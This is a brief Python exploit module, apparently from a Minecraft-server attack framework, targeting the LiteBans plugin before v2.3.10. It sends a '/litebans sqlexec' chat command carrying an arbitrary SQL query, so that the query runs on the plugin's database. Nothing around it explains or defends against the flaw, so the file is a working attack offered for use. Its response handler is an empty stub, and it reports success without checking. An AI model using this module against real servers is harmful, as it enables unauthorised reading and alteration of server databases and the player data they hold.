from minecraft.networking.connection import Connection
import minecraft.networking.packets


class Exploit:
    """Exploit schema"""

    def __init__(self, client: Connection = None, query: str = None):
        self.name = "Litebans < v2.3.10 SQL Injection"
        self.description = "Execute SQL queries on Litebans DB."
        self.query = query
        self.client = client
        self.success = False

    def waitForResponse(self):
        #: check for flag
        pass

    def execute(self) -> tuple[bool, str]:
        self.client.register_packet_listener(
            self.waitForResponse, minecraft.networking.packets.ChatMessagePacket)

        packet = minecraft.networking.packets.ChatPacket()
        packet.message = "/litebans sqlexec {}".format(self.query)
        self.client.write_packet(packet)

        return True, "Success in Message"
